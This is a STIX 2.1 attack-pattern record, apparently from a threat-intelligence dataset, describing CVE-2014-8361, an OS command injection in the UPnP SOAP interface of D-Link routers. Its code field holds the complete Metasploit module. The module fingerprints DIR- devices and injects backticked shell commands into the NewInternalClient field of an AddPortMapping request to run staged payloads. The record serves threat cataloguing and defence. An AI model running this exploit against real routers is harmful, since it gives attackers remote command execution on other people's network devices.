{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70fa66ad-5ead-4af0-969a-fae9c2142dc6",
    "created": "2024-08-14T17:03:53.422661Z",
    "modified": "2024-08-14T17:03:53.422665Z",
    "name": "D-Link Devices UPnP SOAP Command Execution",
    "description": " Different D-Link Routers are vulnerable to OS command injection in the UPnP SOAP interface. Since it is a blind OS command injection vulnerability, there is no output for the executed command. This module has been tested on DIR-865 and DIR-645 devices. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_upnp_exec_noauth.rb",
            "external_id": "dlink_upnp_exec_noauth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8361"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-020"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'D-Link Devices UPnP SOAP Command Execution',\n      'Description' => %q{\n        Different D-Link Routers are vulnerable to OS command injection in the UPnP SOAP\n        interface. Since it is a blind OS command injection vulnerability, there is no\n        output for the executed command. This module has been tested on DIR-865 and DIR-645 devices.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-8361'],\n          ['OSVDB', '94924'],\n          ['BID', '61005'],\n          ['EDB', '26664'],\n          ['URL', 'http://www.s3cur1ty.de/m1adv2013-020']\n        ],\n      'DisclosureDate' => '2013-07-05',\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets' =>\n        [\n          [ 'MIPS Little Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSLE\n            }\n          ],\n          [ 'MIPS Big Endian',  # unknown if there are BE devices out there ... but in case we have a target\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSBE\n            }\n          ],\n        ],\n      'DefaultTarget'    => 0\n      ))\n\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n\n    register_options(\n      [\n        Opt::RPORT(49152) # port of UPnP SOAP webinterface\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => '/InternetGatewayDevice.xml'\n      })\n      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /<modelNumber>DIR-/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the device ...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable device\")\n    end\n\n    print_status(\"Exploiting...\")\n\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 400\n    )\n  end\n\n  def execute_command(cmd, opts)\n    new_portmapping_descr = rand_text_alpha(8)\n    new_external_port = rand(32767) + 32768\n    new_internal_port = rand(32767) + 32768\n\n    uri = '/soap.cgi'\n\n    soapaction = \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"\n\n    data_cmd = \"<?xml version=\\\"1.0\\\"?>\"\n    data_cmd << \"<SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope\\\" SOAP-ENV:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\">\"\n    data_cmd << \"<SOAP-ENV:Body>\"\n    data_cmd << \"<m:AddPortMapping xmlns:m=\\\"urn:schemas-upnp-org:service:WANIPConnection:1\\\">\"\n    data_cmd << \"<NewPortMappingDescription>#{new_portmapping_descr}</NewPortMappingDescription>\"\n    data_cmd << \"<NewLeaseDuration></NewLeaseDuration>\"\n    data_cmd << \"<NewInternalClient>`#{cmd}`</NewInternalClient>\"\n    data_cmd << \"<NewEnabled>1</NewEnabled>\"\n    data_cmd << \"<NewExternalPort>#{new_external_port}</NewExternalPort>\"\n    data_cmd << \"<NewRemoteHost></NewRemoteHost>\"\n    data_cmd << \"<NewProtocol>TCP</NewProtocol>\"\n    data_cmd << \"<NewInternalPort>#{new_internal_port}</NewInternalPort>\"\n    data_cmd << \"</m:AddPortMapping>\"\n    data_cmd << \"</SOAP-ENV:Body>\"\n    data_cmd << \"</SOAP-ENV:Envelope>\"\n\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'vars_get' => {\n          'service' => 'WANIPConn1'\n        },\n        'ctype' => \"text/xml\",\n        'method' => 'POST',\n        'headers' => {\n          'SOAPAction' => soapaction,\n          },\n        'data' => data_cmd\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}